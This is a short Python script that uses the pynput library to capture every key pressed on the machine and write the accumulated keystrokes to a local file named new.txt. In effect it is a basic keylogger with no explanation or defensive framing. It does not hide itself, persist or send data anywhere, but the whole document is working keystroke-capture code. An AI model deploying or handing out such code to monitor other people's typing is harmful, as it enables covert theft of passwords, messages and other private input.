from time import sleep
import pynput.keyboard
log =""
def key_press(key):
    global  log
    log = log +str(key)
    f = open('new.txt', mode='w')
    f.write(log)

    #print(log)


kbl = pynput.keyboard.Listener(on_press=key_press)
with kbl:
    kbl.join()




